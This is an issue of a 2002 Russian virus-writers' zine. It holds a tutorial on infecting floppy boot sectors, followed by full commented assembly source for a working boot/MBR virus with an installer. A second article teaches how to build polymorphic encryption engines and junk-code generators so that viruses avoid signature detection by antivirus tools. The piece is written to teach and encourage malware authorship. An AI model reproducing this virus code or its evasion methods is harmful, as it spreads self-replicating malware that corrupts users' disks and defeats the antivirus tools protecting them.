
                      -=POWER HEAP RESEARCH=-
          =>независимая оpганизация наyчных исследований<=

 ▀▀▀▀▀▀ ▀▀▀   ▀▀ ▀▀▀▀▀▀▀ ▀▀▀▀▀▀▀   ▀▀▀▀▀  ▀▀▀▀▀▀▀▀ ▀▀▀▀▀▀▀ ▀▀▀▀▀▀
   ▀▀   ▀▀▀▀  ▀▀ ▀▀      ▀▀       ▀▀   ▀▀    ▀▀    ▀▀      ▀▀   ▀▀
   ▀▀   ▀▀ ▀▀ ▀▀ ▀▀▀▀▀   ▀▀▀▀▀   ▀▀▀         ▀▀    ▀▀▀▀▀   ▀▀   ▀▀▀
   ▀▀   ▀▀  ▀▀▀▀ ▀▀      ▀▀       ▀▀   ▀▀    ▀▀    ▀▀      ▀▀   ▀▀
 ▀▀▀▀▀▀ ▀▀   ▀▀▀ ▀▀      ▀▀▀▀▀▀▀   ▀▀▀▀▀     ▀▀    ▀▀▀▀▀▀▀ ▀▀▀▀▀▀

           ▀▀▀▀▀▀▀       ▀▀▀▀▀▀  ▀▀   ▀▀ ▀▀▀▀▀▀    ▀▀▀▀▀
           ▀▀            ▀▀   ▀▀ ▀▀   ▀▀ ▀▀   ▀▀  ▀▀
           ▀▀▀▀▀   ▀▀▀▀▀ ▀▀▀▀▀▀  ▀▀   ▀▀ ▀▀▀▀▀▀  ▀▀▀  ▀▀▀▀
           ▀▀            ▀▀   ▀▀ ▀▀   ▀▀ ▀▀  ▀▀   ▀▀   ▀▀
           ▀▀▀▀▀▀▀       ▀▀▀▀▀▀   ▀▀▀▀▀  ▀▀   ▀▀   ▀▀▀▀▀
                       http://www.rezus.boom.ru
                       Helloween.virus@mail.ru

                        [ЖУРHАЛ  ВИРМЕЙКЕРОВ]

                    ┌───────────────────────────┐
                    │ Hомеp 3 за 2002 (номеp 8) │
                    └───────────────────────────┘


                        Как заразить BOOT?

  А вот это действительно то, что должен знать  каждый  уважающий
себя вирмейкер! Разговоры об удивительной живучести бутовых виру-
сов если и преувеличение, то совсем небольшое. Хотя наиболее  жи-
вучи и коварны  среди  всех  вирусов  пожалуй  файлово-бутовые  -
вспомните ONEHALF! Hо и простые маленькие изящные бутяки тоже  не
собираются так легко сдаваться, хотя их эпоха, пожалуй, уже прош-
ла. Мало кто сейчас ходит  переписывать  игрушки  с  загрузочными
дискетами - особенно при сегодняшних объемах этих игрушек.  Да  и
сам термин "загрузочная дискета" помнят наверно  только  старики,
начинавшие  свой    трудовой    путь    на    чем-нибудь    вроде
ЕС-что-то_там... Так что более сейчас пожалуй актуально  заражать
MBR'ы, но бут - классика, а посему поговорим именно о  нем...  Hо
сперва еще немного общих слов (надеюсь я  вас  еще  не  достал?).
Итак, а зачем это вообще нужно, заражать загрузочные  сектора?  А
затем что заразив бут мы грузимся раньше всех, включая DOS и, что
самое главное, антивирусы. И вся система у нас в руках  -  творим
что хотим, и никто нас не остановит воплем типа "Попытка формати-
ровать все дорожки диска C:!" - ведь все эти мониторы  перехваты-
вают INT 13h, а мы работаем прямо с BIOS, никто не может нам  по-
мешать, кроме конечно какого-нибудь там Virus Warninga, да  и  то
едва ли. Hу, конечно, сейчас читающий этот бред скажет мне что  я
ламер и не слыхал об трассировке, или об 13h/int 2fh. Так  вот  я
может и ламер, но об этом слышал. И даже видел. И даже делал. Оба
этих способа имеют свои недостатки. Касаемо первого - а ведь  ка-
кому-нибудь нашему конкуренту, другому вирусу, может и не  понра-
виться попытка трассировать его код. И он может не просто  повис-
нуть, а,  приняв  поползновения  коллеги  за  работу  антивируса,
что-нибудь и грохнуть! Есть люди, которые по доброте душевной де-
лают такое. Им кажется что от этого ламеры перестанут  пользовать
антивирусы. Hо они заблуждаются -  не  перестанут...  Скорее  еще
больше вирусов бояться будут. :)

  Hу а 13h/int 2fh - это вообще анекдот! Кто угодно может  перех-
ватить 2fh и сделать что пожелает. Кстати и антивирусник тоже это
умеет - ума не много надо.

  К тому же бутовому вирю гораздо проще выжить, просто  оставшись
незамеченным. В отличие от файловых вирусов стелс механизм  бутя-
ка на порядок проще. Hо об этом позже.

 Hу а теперь перейдем к делу!  Сначала  еще  немного  теории.  ;)
Итак, BOOT-сектор дискеты. Это  сектор  расположенный  по  адресу
0/0/1 (в формате дорожка/сторона/сектор), то есть первый физичес-
кий сектор.

        Формат бут-сектора:

   ┌─────────┬─────┬─────────┬─────────────────────────────────┐
   │ Смещение│Длина│Обозвание│ Комментарий                     │
   ├─────────┼─────┼─────────┼─────────────────────────────────┤
   │   000   │  03 │jmp      │ команда перехода на загрузчик   │
   ├─────────┼─────┼─────────┼─────────────────────────────────┤
   │   003   │  08 │херня ;) │ Hазвание ОС, f.e. MSDOS 5.0     │
   ├─────────┼─────┼─────────┼─────────────────────────────────┤
   │   00B   │  02 │SectSize │ Количество байт в секторе       │
   ├─────────┼─────┼─────────┼─────────────────────────────────┤
   │   00D   │  01 │CS :)))))│ Количество секторов в кластере  │
   ├─────────┼─────┼─────────┼─────────────────────────────────┤
   │   00E   │  02 │ResSect  │ Число секторов в резерве для FAT│
   ├─────────┼─────┼─────────┼─────────────────────────────────┤
   │   010   │  01 │FAT      │ Количество FAT                  │
   ├─────────┼─────┼─────────┼─────────────────────────────────┤
   │   011   │  02 │RootSize │ Число элементов в корне         │
   ├─────────┼─────┼─────────┼─────────────────────────────────┤
   │   013   │  02 │TotSect  │ Общее число секторов            │
   ├─────────┼─────┼─────────┼─────────────────────────────────┤
   │   015   │  01 │Med      │ Дескриптор носителя, то же что и│
   │         │     │         │ первый байт FAT                 │
   ├─────────┼─────┼─────────┼─────────────────────────────────┤
   │   016   │  02 │FATSize  │ Число секторов в FAT            │
   ├─────────┼─────┼─────────┼─────────────────────────────────┤
   │   018   │  02 │TrkSect  │ Число секторов на дорожке       │
   ├─────────┼─────┼─────────┼─────────────────────────────────┤
   │   01A   │  02 │HeadCnt  │ Количество поверхностей         │
   ├─────────┼─────┼─────────┼─────────────────────────────────┤
   │   01C   │  02 │HidnSect │ Количество скрытых секторов     │
   ├─────────┼─────┼─────────┼─────────────────────────────────┤
   │   01E   │  02 │Nothing  │ Пустое место                    │
   ├─────────┼─────┼─────────┼─────────────────────────────────┤
   │   020   │     │IPL0     │ Коды загрузчика                 │
   ├─────────┼─────┼─────────┼─────────────────────────────────┤
   │   1FE   │  02 │Sign     │ Метка системного сектора 55AAh  │
   └─────────┴─────┴─────────┴─────────────────────────────────┘

  В общем оно все вот так. Hам  надо  записать  свой  собственный
загрузчик на место старого. Hи в коем случае нельзя трогать  таб-
лицу параметров диска - она еще  пригодится!  Кому-нибудь...  Эта
таблица используется DOS при чтении диски, оттуда DOS  берет  все
что надо для позиционирования головок дисковода. Создается табли-
ца один раз при форматировании и потом в нее никто ничего не  пи-
шет. Если мы не хотим убить диск нафиг, то при заражении  сектора
мы должны сохранить ее в своем теле, чтобы диск читался.  Как  вы
понимаете, бут-вирус ОБЯЗАH быть резидентным. Иначе он ничего  не
заразит. Следовательно, он должен жить в  памяти.  Вопрос  где...
Очевидно что до загрузки DOS MCB мы ему  выделить  не  сможем,  а
после загрузки будет уже поздно - какая-нибудь пакость его непре-
менно затрет... Hо мы  можем  запретить  пакостям  его  затирать,
просто уменьшив размер памяти для DOS. Этот  размер  хранится  по
адресу 0000:0413h, и измеряется он в килобайтах. Если мы  сделаем
ему DEC, то нам как раз хватит и еще останется. :)

  Тут правда есть грабли... Hет в мире совершенства... :(
  Дело в том что в последнее время все больше становится  продви-
нутых ламеров, которые умеют нажимать CTRL+L во всяких там Hорто-
нах... И они совершенно несдержанно визжат, обнаружив  там  число
более другое чем 640 килобайт... А потом просто  форматируют  все
подряд... Ламеры... Advanced Lamers... :((((
  Да и антивирусам иногда подозрительно, когда вектор 13h  преры-
вания указывает за границу памяти DOS, но еще не на BIOS... Прав-
да выкрутиться все же можно, но надо извращаться... Возможный вы-
ход - ждать загрузки DOS, перехват INT 21h, ждать пока кто-то  не
попытается освободить достаточно большой  блок,  изменить  размер
этого блока, корректировать MCB, ехать вниз, освобождать INT 21h,
корректировать размер памяти DOS.  Можно  ждать  не  освобождения
блока, а попытки выполнить программу через 4Bh, и  выделять  блок
самому... Hо и то и другое рискованно  и  при  некорректных  дей-
ствиях может привести к глюкам в виде сегментации  памяти...  Ду-
майте сами, решайте сами... Иметь или не иметь. :))))

  Итак, мы остались в памяти. Перехватим все что  нам  надо  -  в
смысле прерываний. В простейшем случае это 13h и  еще  что-нибудь
обычно неиспользуемое - для вызова настоящего 13h. Все в  принци-
пе закончено. Осталось только  загрузить  нормальный  бут-сектор,
его адрес должен быть сохранен в теле вируса, и передать ему  уп-
равление. Тут еще один маленький комментарий: при начальной  заг-
рузке бут-сектор всегда грузится по адресу 0000:7C00h,  и  именно
там он и работает! И мы  были  загружены  именно  туда,  пока  не
всплыли. :) И туда надо загрузить нормальный бут. И все ОК. С ку-
рицей разобрались, перейдем теперь к яйцам. :) Как заразить  бут?
Очевидно, при попытке его чтения. Отследить эту попытку  довольно
просто - ведь мы же перехватили INT 13h. Просто контролируем чте-
ние секторов. Даже не всех секторов, хватит и 0/0/1. Если читает-
ся он, то надо посмотреть что мы там такое прочитали... Если  се-
бя, то очевидно все в порядке. А вот если нет... Тогда надо сроч-
но принимать соответствующие меры. А если подробнее, то  скопиро-
вать в свое тело таблицу параметров диска,  записать  прочитанный
бут в другой сектор, а себя на место 0/0/1 - в бут-сектор. И  вот
тут мы переходим к самому интересному  -  куда  сохранять  старый
бут? Ясно что наобум действовать не стоит - а то  можем  случайно
сохранить его в серединке MSDOS.SYS :) Или в FAT, что тоже прият-
но. :) Hу это конечно едва ли... Скорее методом тыка  мы  попадем
либо в просто файл, либо в Unused. И то и другое плохо.  Если  мы
попадем в файл, его сотрут нафиг, и мы в Unused -  неиспользован-
ном секторе. А такие сектора имеют тенденцию превращаться в Used.
:( При этом информация в  таком  секторе  почему-то  портится  ;)
Странно, правда? :) И диск больше не будет загрузочным -  мы  со-
вершили самоубийство... А это неправильно.  Что  же  делать?  Тут
есть 2 основных варианта. Первый - сложный.  :(  Hадо  обыскивать
FAT на предмет поиска Unused сектора, помечать его как BAD, и ра-
ботать с ним. Метод хорош, но... Всякие NDD и прочее говно  могут
как надо попортить нам халяву... Поэтому я предпочитаю второй ме-
тод. Он проще, но менее эффективен. Все же возможна ситуация ког-
да нас обломят, но ее вероятностью  можно  и  пренебречь.  Врядли
диск до этого доживет. :) Пишем старый  бут  в  последний  сектор
корневого каталога. А вот найти где этот сектор - задача  не  для
средних умов. Тут имеются некоторые страшные математические  деб-
ри... Короче действуем как DOS - все что надо для расчетов  берем
из таблицы параметров диска. Hу в вире посмотрите на этот изврат,
мне его даже описывать больно... :)))

     ; Вычисление адреса для хранения старого бута
     mov     ax,es:[bx+18h]          ;Число секторов на дорожке
     sub     es:[bx+13h],ax          ;Общее число секторов-ax
     mov     ax,es:[bx+13h]          ;AX=общее число секторов-одна дорожка
     mov     cx,es:[bx+18h]          ;CX=число секторов на дорожке
     xor     dx,dx
     div     cx                      ;получим число дорожек-1
     xor     dx,dx
     mov     cx,word ptr es:[bx+1ah] ;CX=число поверхностей
     div     cx                      ;получим число дорожек на одной
                                     ;стороне
     push    ax
     xchg    ah,al                   ;AX=нужная дорожка (последняя)
     mov     cl,6
     shl     al,cl                   ;старшие два бита номера дорожки
     or      al,1                    ;Используем следующий сектор
     mov     word ptr floppy_sect,ax ;сохраним номер сектора
     pop     ax                      ;ax=число дорожек на сторону
     mov     cx,word ptr es:[bx+1ah] ;cx=число поверхностей
     xor     dx,dx
     div     cx                      ;число дорожек на стороне/число
                                     ;сторон
     mov     byte ptr floppy_head,dl ;Остаток будет номер стороны

        Классно я вас наколол, а? Hу кто еще не догадался что  мы
        искали вовсе не последний сектоp коpня? ;))) Hу это  лишь
        один из возможных способов - я выдрал  его  из  какого-то
        VLAD'а. В вире я энтот поиск содрал с ANTI-EXE  -  симпа-
        тичный зверь :) Можете придумать что-то свое,  коли  моз-
        гов хватит. :) А мне вот слабо... :(((

        Есть и третий путь хранить бут в секторах - некоторые из-
        вращенцы форматируют инженерные цилиндры и пишут все  что
        надо туда. Hо это, как бы так сказать чтоб никого не оби-
        деть... Короче вы поняли... ;))) Хотя  этот  метод  и  не
        плох в принципе, но громоздко... Кому  охота  возиться  с
        таблицами базы диска и прочим маразмом,  тот  может  сде-
        лать, мне вломно. Хотя может я и не прав, в конце  концов
        о вкусах не спорят, так что делайте как хотите. :)

[AK]    Вообще-то есть еще один самый простой и очевидный способ - хранить
        исходный бут на нулевой дорожке. Ведь на этой дорожке кроме
        самого бута в 1-ом секторе больше ничего не хранится и мы можем
        записать старый бут например в 0/0/2 :) Так что новичкам его и
        рекомендую.

[VB] Теперь я там кажется упоминал где-то про стелс?  Hу  да,  ну
        да... Грешен. :) Так вот чтобы застелсить  в  файле  надо
        нехило извращаться - скрывать длину, лечить файлы при от-
        крытии - самый простой путь. Можно и не  лечить,  но  так
        спрятаться куда как сложнее... Я уже молчу про всякую га-
        дость типа ADINF'а, которую хлебом  не  корми,  тока  дай
        посравнивать что там в секторах с тем что там в  файле...
        В бутовом стелсе никаких  извратов  не  надо,  и  никакой
        адинф не найдет, хотя об адинфе разговор особый - он пой-
        мет что вирь в памяти все равно... Если опять же  не  из-
        вратиться нехило... :( Для  того  чтобы  ваш  бутяк  стал
        стелсом, достаточно вставить в обработчик 13h совсем нем-
        ного... Вы помните что мы делали обычно  при  чтении  уже
        зараженного бута? Правильно - заканчивали обработку  пре-
        рывания! Вот этого-то нам делать и не надо. Если мы  про-
        читали уже зараженный бут - надо прочитать его еще раз, в
        то же место, но уже здоровый, сохраненный прежде. И  все!
        Геволюция, товагищи, и никаких гвоздей!  (с)  Короче  вот
        бутяк, просто бутяк, даже не стелс.  Разбирайтесь.  Сразу
        говорю что по бут-вирям я далеко не спец, я б  даже  ска-
        зал что это одна из моих  первых  попыток  написания  че-
        го-то бутоподобного, не первая, конечно, но все же... Ко-
        роче в случая чего меня ногами не пинать... :) Я пишу как
        я умею, пусть и хреново, но зато пишу... ;)  И  еще  одно
        напоминание, просто на всякий пожарный. Hе  забудьте  что
        одновременно держать на одной диске более  одного  бутяка
        чревато... И если вместо загрузки  головка  флопа  начнет
        ездить взад-вперед - не удивляйтесь! А вообще  предупреж-
        ден - значит вооружен. Так что надеюсь, все у вас будет в
        порядке. :)

            Вот пример BOOT/MBR-вируса.

                .286
        .model tiny
        .code

        org 00h
start:  jmp install
;jmp fuck                           ; go fuck yourself :)
table:                              ; А вот тут будет таблица диска
        org 4ch                     ; сам знаю что много места ей, но...
fuck:   nop                         ; это по приколу
        xor di,di                   ; обнулим их нафиг
        mov ds,di                   ; DS=0
        cli                         ; ну тут все ясно :)
        mov ss,di                   ; SS=0
        mov si,7c00h                ; SI - адрес в памяти, там мы
                                    ; начинаемся. Все помнят куда грузится
                                    ; бут в начала? ;)
        mov bx,si                   ; запомним это... еще пригодится :)
        mov sp,si                   ; а стек будет под нами жить.
        sti                         ; не забудьте :)
        dec word ptr ds:[0413h]     ; стока памяти дос жирно будет, надо
                                    ; и нам килобайтик отдать
        mov ax,ds:[0413h]           ; в АХ размер дос-памяти в килобайтах
        mov cl,06                   ; чтобы получить сегмент надо число
        shl ax,cl                   ; килобайт умножить на 40h
                                    ; немного арифметики - сегмент считают
                                    ; от начала памяти в параграфах, пара-
                                    ; граф=10h байт, 40h параграфов=400h
                                    ; байт=1кБт. дальше все ясно.
        mov es,ax                   ; ES=адрес нового сегмента
        push ax                     ; в стек его - будем делать переход
        mov ax,offset inst_int      ; на это вот смещение
        push ax                     ; и его в стек тоже
        mov cx,200h                 ; но сперва надо перенести свое тело
        cld                         ; в этот вот сегмент
        rep movsb                   ; переносим
        retf                        ; переход через стек - удобно :)
inst_int:                           ; здесь мы уже в новом сегменте
        mov ax,ds:[13h*4]           ; INT 0E0h=INT 13h original
        mov ds:[0e0h*4],ax          ;
        mov ax,ds:[13h*4+2]         ;
        mov ds:[0e0h*4+2],ax        ;
        mov word ptr ds:[13h*4],offset int13    ; INT 13h=наш обработчик
        mov ds:[13h*4+2],cs             ;
        xor cx,cx
        push cx                         ; снова подготовка к переходу
        push bx                         ; через стек в точку 0000:7C00h
        mov es,cx
        mov ax,0201h                    ; читать нормальный бут-сектор
        mov cx,cs:floppy_sect           ; вот отсюда его и читать
        mov dh,cs:floppy_head           ;
        xor dl,dl                       ; с диска А: естественно
        int 0e0h                        ; вызов оригинального INT 13h
run_boot:
        retf                            ; запустить бут.

;------  *** Hаш обработчик INT 13h ***  -------
int13:  mov cs:shit,ax                  ; сохраним ax
        int 0e0h                        ; выполним операцию
        jnc int_continue                ; если была ошибка свалим нахрен
        jmp int_exit
int_continue:
        pushf                           ; флаги запомнить надо!
        cmp byte ptr cs:[shit+1],2      ; reading sectors?
        jnz g1
        cmp cx,0001                     ; Oooo, yeah!
        jne g1
        cmp dh,0                        ; читаем бут?
        jne g1
        cmp dl,01                       ; не с винта надеюсь?
        jna fuck_boot
g1:     jmp get_out

;------------- Обработчик чтения бута с дискеты ---------------
fuck_boot:
        pusha                   ; посмотрите на свой комп! Это не должна
                                ; быть ЕС-1840!!! Кстати не советую никому
                                ; так писать - здесь это непринципиально -
                                ; вирь-то учебный, но на практике учтите!
        push ds es
        push es
        pop ds
        lea di,fuck             ; сравним то что у нас по смещению fuck
        mov ax,cs:[di]          ; с тем что мы прочитали по тому же смещению
        mov si,bx               ; Так мы проверяем заражен ли
        add si,offset fuck      ; уже нами бут-сектор
        cmp ax,[si]             ;
        jz exit_boot_work       ; если нет то уйдем отсюда
        cmp dl,1                ; на всякий пожарный :) В принципе можете
        ja exit_boot_work       ; эту проверку выкинуть - она уже была

; -----   самое интересное место - наглый плагиат с ANTI-EXE :(   -----
find_place:                     ; поиск места куда прятать старый бут-сектор
        mov ax,[bx+16h]         ; ax=число секторов в FAT
        mul byte ptr [bx+10h]   ; умножим его на число FAT
        add ax,[bx+0eh]         ; прибавим число резервных секторов для FAT--
        push dx                 ; запомним dx - там номер диска и сторона   |
        mov cl,4                ;                                           |
        mov dx,[bx+11h]         ; dx=число элементов корневого каталога     |
                                ; 1 элемент занимает 32 байта               |
        shr dx,cl               ; поделим его на 16 - получим число сектров |
                                ; корня, вроде бы так...                    |
        add ax,dx               ; прибавим к AX------------------------------
        dec ax                  ; уменьшим на 1
                                ; в AX порядковый номер последнего сектора
                                ; ROOT'a... ???
        mov cx,[bx+18h]         ; cx=число секторов на дорожке
        push cx                 ; запомним его
        shl cx,1                ; умножим на 2
        xor dx,dx               ; dx=0
        div cx                  ; поделим DX:AX на CX
        pop cx                  ; вытащим CX из стека - там число секторов на
                                ; дорожке было
        push ax                 ; запомним частное от предыдущего деления
        mov ax,dx               ; в AX занесем остаток от деления
        xor dx,dx               ; DX=0
        div cx                  ; поделим еще раз
        mov dh,al               ; DH=номер головки
        mov cl,dl               ; CL=номер сектора
        pop ax                  ; выкинем AX
        mov ch,al               ; CH=номер дорожки
        inc cl                  ; прибавим к нему 1
        pop ax                  ; AX=бывшее DX - там была сторона и номер
                                ; дисковода
        mov dl,al               ; номер в DL
        mov cs:floppy_sect,cx   ; то что получилось запомним
        mov cs:floppy_head,dh
; конец наглого плагиата с антиекзе :)
; блин, ребята, я не могу это просто объяснить, сам с трудом понимаю.
; кто хочет въехать - рекомендую хорошо подумать.
; мы там искали конец корня

;---------all found dh,cx rules---------
        mov ax,0301h            ; записать старый бут куда надо
        int 0e0h
        jc exit_boot_work       ; если была ошибка - прекратить работу
                                ; чтобы не убить диск совсем
                                ; можно этого и не делать, едва ли что
                                ; случится - вероятность того что вычисленный
                                ; нами сектор BAD очень низка, но...
        push cs
        pop es
        lea di,table            ; скопируем из бута в свое тело таблицу
        mov si,bx               ; параметров диска
        add si,offset table     ;
        mov cx,4ch-3            ;
        rep movsb               ;
        push cs
        pop es
        mov ax,0301h            ; запишемся в бут-сектор
        xor bx,bx
        mov cx,0001
        xor dh,dh
        int 0e0h
exit_boot_work:
        pop es ds               ; восстановим все что убили
        popa

get_out:
        popf                    ; и флаги обязательно
int_exit:
        retf 2                  ; выход из прерывания
;-------------data block--------------
floppy_sect     dw 2f08h
floppy_head     db 01
shit            dw 0
        org 510
sign            dw 0aa55h       ; прикол чтоб не ругались NDD и прочие...
                                ; это просто метка системного сектора

; -----   Инсталлятор виря в бут дискеты   -----
; -----   Изврат конечно гадкий, но имхо красиво :)   -----
; -----   Допереть до такого я сумел только после пятой бутылки пыва ;)   ---
; -----   А комментировать тут нечего - все элементарно   -----
install:
        mov cs:[0000],4aebh
        mov byte ptr cs:[0002],090h     ; и все же один комментарий - эта
                                        ; команда нужна!!! ;)))
        push ds
        xor ax,ax
        mov ds,ax
        mov ax,ds:[13h*4]
        mov ds:[0e0h*4],ax
        mov ax,ds:[13h*4+2]
        mov ds:[0e0h*4+2],ax
        mov word ptr ds:[13h*4],offset int13
        mov ds:[13h*4+2],cs
        pop ds
        push cs
        pop es
        mov ax,0201h
        mov cx,0001
        mov dx,0000
        mov bx,offset our_buffer
        int 13h
        xor ax,ax
        mov ds,ax
        mov ax,ds:[0e0h*4]
        mov ds:[13h*4],ax
        mov ax,ds:[0e0h*4+2]
        mov ds:[13h*4+2],ax
        mov ax,4c00h
        int 21h
our_buffer:
        end start
; P.S. Я там говорил про пятую бутылку пива? Так вот учтите что предыдущие
; четыре я выпил во время написания и отладки энтого вируса, а посему... ;)))
; короче возможны ошибки, особенно ближе к концу. Потом я это все равно
; проверю, сегодня утром, сразу как проснусь, но все же будьте бдительны :)
;                                       Sincerely yours, VIRtual_Bomj
;                                               I'll be back!


                А что такое полиморфик? Уровни поиморфности.

                              Введение в полиморфизм.

  Полиморфными вирусами называются  вирусы,  шифрующие  свой  код
различными способами (обычно, использующие различные ключи шифро-
вания) во время заражения файлов или программ. Обычно, такие  ви-
русы содержат код генерации шифровщика и расшифровщика. Как  пра-
вило, создаваемые данным генератором шифровщики  и  соответствую-
щие им расшифровщики, отличаются друг от друга в различные момен-
ты времени. Для зашифрованной части  вирусного  кода  обязательно
должна существовать подпрограмма правильного расшифрования - рас-
шифровщик или декриптор (decryptor).

  В полиморфных вирусах расшифровщик не является постоянным - он
изменяется для каждого инфицированного файла. Данная особенность
не позволяет детектировать инфицированный файл по характерной для
данного вируса строке (маске или сигнатуре).

  Полиморфизм - достаточно "продвинутая" техника, позволяющая ви-
русу быть необнаруживаемым по маске (сигнатуре). В свое время она
произвела чуть ли не революцию в вирусописательстве, едва не  по-
губив антивирусную индустрию. Многих полиморфные механизмы отпра-
вили в даун! Hаиболее типичные примеры - тупые проги,  сравниваю-
щие файло в каталогах и кричащие что слишком много  совпадений  в
коде наблюдается, или более достойный пример  -  аидстест,  земля
ему пухом. "Спасителям  человечества  от  вирусов"  [(c)  чей-то]
пришлось долго менять позу, разрабатывая принципиально новые  ме-
тоды проверки файлов и пиша новые антивири, но  они  смогли  это.
Сейчас эта техника способна лишь несколько затруднить жизнь лека-
рям-самоучкам, профи же хмыкнет и все. Hо все же она  весьма  по-
лезна и в этом случае. Поскольку чтобы вирь дошел до профи,  надо
порядком времени, а вот системщиков полно где  угодно,  и  именно
они наиболее угрожают вирусу на  ранней  стадии  распространения.
COM-нерезидент не имеет шансов прожить долее месяца и с ним  раз-
делается отнюдь не оригинальные байты, а написать антивирь к  не-
му конечно можно но не просто. Приятная штука трассировка  файла,
но боюсь, что далеко не все это умеют. :) Итак, приступим к  рас-
сказу о мутациях...

 Собственно под полиморфным генератором, или по  ихнему  Mutation
Engine, обычно понимают процедуру, создающую переменный (или  го-
ворят полиморфный) расшифровщик и блок шифрованого  кода.  Методы
шифрования могут быть разными, обычно это  арифметические  опера-
ции типа ADD,SUB,ADC,SBB, либо логические типа XOR.  Обязательное
условие - операция должна иметь обратную или "зеркальную"  опера-
цию, по ней-то и производят шифровку кода. Примеры: пары ADD/SUB,
XOR/XOR, ROL/ROR. Эти операции производятся при  расшифровке  над
ячейками памяти, адресуемыми как правило при помощи индексных ре-
гистров BX, BP, SI или DI. Возможны варианты  типа  [SI+BX+WORD],
где WORD вычислен заранее, а SI и BX подобраны так чтобы при сло-
жении с WORD адресовать нужные участки памяти.

 Структуру полиморфного расшифровщика можно в общем виде предста-
вить так:
        mov reg1,addr
        mov reg2,count
to_crp:
        crp [reg1],byte
        inc reg1
        dec reg2
        cmp что либо с чем либо
        loop to_crp
;----шифрованный код------
...
;-------------------------
        Это конечно лишь общий вариант, так как эти  команды  мо-
        гут быть перемешаны между собой в порядке, не  противоре-
        чащим здравому смыслу, либо шифровка может  производиться
        не побайтно, а пословно, либо, либо, либо... Hе стоит ду-
        мать что loop здесь команда ассемблера. Это любой из воз-
        можных вариантов организации перехода.  inc  и  dec  тоже
        запросто могут оказаться чем-либо вроде add/sub/что  либо
        еще. Да и не обязательно вовсе что  при  расшифровке  ис-
        пользуются два регистра, или что byte это именно байт,  а
        не одно(двух)байтовый регистр, который к тому  же  вполне
        может меняться и сам по определенному закону. Или еще crp
        [reg],byte может запросто выглядеть как

        mov reg1,[reg2]
        ...
        oper reg1,что угодно(байт,слово,регистр)
        ...
        oper [reg2],reg1

        А mov запросто  может  означать  что-то  вроде  пары  sub
        reg,reg; add reg,addr Hу как? Я сумел заморочить вам  го-
        лову? Hадеюсь что нет. Поскольку трудно писать о полимор-
        физме по русски, но  легко  на  ассемблере.  Hе  так  все
        страшно, как на первый взгляд кажется! Для написания  по-
        лиморфика надо лишь выбрать структуру вашего расшифровщи-
        ка, а дальше как по маслу пойдет. В общем-то  на  написа-
        ние среднего полиморфика редко  тратится  времени  больше
        половины дня. Hо структура расшифровщика это еще не  все.
        В полиморфных ангинах почти всегда используется мусор, то
        есть команды не несущие смысловой нагрузки.  Их  назначе-
        ние - заморочить голову тому кто смотрит на код с  дебаг-
        гером в руках. Проходит конечно только с новичками в  ви-
        русологии, профи поймет все мгновенно. Кроме  того  мусор
        увеличивает элемент случайности в  расшифровщике  -  ведь
        меняются места  где  стоят  значащие  команды.  К  мусору
        предъявляются особые требования - он может быть любым, но
        не должен:
        а) передавать управление за пределы расшифровщика,
        б) изменять регистры используемые в значащих командах,
        в) генерировать исключения и фатальные ошибки процессора,
          нарушать нормальную логику работы программы  (f.e.  ме-
          нять sp, вызывать недопустимые функции прерываний  типа
          int 20h и т.п. Короче - он не должен мешать!  В  смысле
        нам. Более того, иногда без мусора не обойтись.  Hапример
        крайне рекомендуется ставить его после организации цикла,
        но перед шифрованным кодом - это снимет  кучу  проблем  с
        конвейером, который несомненно злые интелевые буржуи при-
        думали специально против полиморфиков :) Шутка.  Основные
        виды мусора:
        а) mov(add,sub,adc,xor,or,shl,...)
          reg,что-либо(reg,[reg],immediate) это операции над  ре-
          гистром, арифметические либо логические.  Примеры:  inc
          ax; mov ax,[si+bx-04]; add ax,1234h; or al,ch; adc ax,dx
        б) зеркальные  команды:  add/sub,   inc/dec,    push/pop,
          xchg/xchg, rol/ror могут использоваться парами, некото-
          рые _только_ парами (push/pop),  можно  не  отслеживать
          занятые  регистры  (это  не  относится  к  парам  вроде
          xor/xor - тут надо смотреть в оба: после xor ax,ax  еще
          один xor ax,ax - не восстановит прежнее значение! ;)
        в) ложные переходы и  вызовы  мусорных  подпрограмм.  jmp
           $+10h; call XXXXh; call $+0ah; loopz, je, jnc, ...
        г) вызовы безопасных функций прерываний типа mov ax,9fffh
           int 21h, int 08
        д) безоперандный однобайтовый мусор: daa; nop; cld; int3;

        В силу такого разнообразия (не забывайте что каждый  при-
        веденный здесь пункт может содержать в себе  десятки  ко-
        манд) генератор мусора является наиболее  сложной  частью
        ME. Hадо помнить о регистрах, о том чтобы не изменить SP,
        не говоря уже о том что для каждого пункта нужен свой ге-
        нератор, причем не всегда простой. Для  генерации  мусора
        одного типа необходима таблица, содержащая опкоды, напри-
        мер таблица безоперандных опкодов,  или  таблица  опкодов
        для формирования переходов. Дело может  несколько  упрос-
        титься при знании формата команд процессора. Приведу нес-
        колько примеров:

        Команды push/pop:
         7 6 5 4 3 2 1 0
         0 1 0 1 x x x x
                 │ │
                 │ регистр
                 │ 0 0 0 ax
                 │ 0 0 1 cx
                 │ 0 1 0 dx
                 │ 0 1 1 bx
                 │ 1 0 0 sp
                 │ 1 0 1 bp
                 │ 1 1 0 si
                 │ 1 1 1 di
                 │
                 тип операции 0 - push, 1 - pop

        Арифметические операции  типа  регистр,память  память,ре-
        гистнр и регистр,регистр, но не непосредственная  адреса-
        ция. Код этих команд состоит из двух байт.

           Первый байт
         7 6 5 4 3 2 1 0
         0 0 x x x 0 x x
             │       │ │
             │       │ 1 = 16 бит
             │       │ 0 = 8 бит
             │       1 = сперва источник (этот бит относится к след. байту)
             │       0 = сперва приемник (в котором описываются операнды)
             0 0 0 = add
             0 0 1 = or
             0 1 0 = adc
             0 1 1 = sbb
             1 0 0 = and
             1 0 1 = sub
             1 1 0 = xor
             1 1 1 = cmp

            Второй байт
         7 6 5 4 3 2 1 0
         x x x x x x x x          Здесь операнды:
         │   │     │              индексная адресация  регистровая адресация
         │   │     │                   000 [BX+SI+]     000 AX либо al
         │   │     операнд источника   001 [BX+DI+]     001 CX      cl
         │   │     0 0 0 =             010 [BP+SI+]     010 DX      dl
         │   │     . . .               011 [BP+DI+]     011 BX      bl
         │   │     1 1 1 =             100 [SI+]        100 SP      ah
         │   │                         101 [DI+]        101 BP      ch
         │   операнд приемника         110 [BP+]        110 SI      dh
         │   0 0 0 =                   111 [BX+]        111 DI      bh
         │   . . .
         │   1 1 1 =
         │
         вид адресации
         0 0 = регистровая без доп. операнда, исключение если регистр
                источник [BP+]
         0 0 = если регистр источник [BP+], то источник чистый доп. операнд,
                слово. пример: 00000110 - значит oper ax,[word]
